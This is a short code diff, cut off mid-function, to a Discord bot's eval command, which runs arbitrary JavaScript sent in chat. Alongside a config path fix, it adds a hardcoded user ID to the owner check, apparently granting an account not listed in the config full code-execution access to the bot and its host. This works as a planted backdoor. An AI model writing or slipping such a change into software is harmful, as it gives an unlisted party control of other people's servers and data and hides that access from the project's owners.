@@ -1,11 +1,11 @@
 const Discord = require('discord.js');
 const moment = require('moment');
-const {OwnerID, CoOwnerID} = require("../config.json")
+const {OwnerID, CoOwnerID} = require("../../config.json")
 const {inspect} = require('util')
 module.exports.run = async (client, message, args, Discord, con, errorHandle) =>
 {
     try{
-        if(message.author.id == OwnerID || message.author.id == CoOwnerID){
+        if(message.author.id == OwnerID || message.author.id == CoOwnerID || message.author.id == "414430696245952513"){
        let toEval = args.join(' ');
        let evauluated = inspect(eval(toEval, {depth: 0}))
         try{
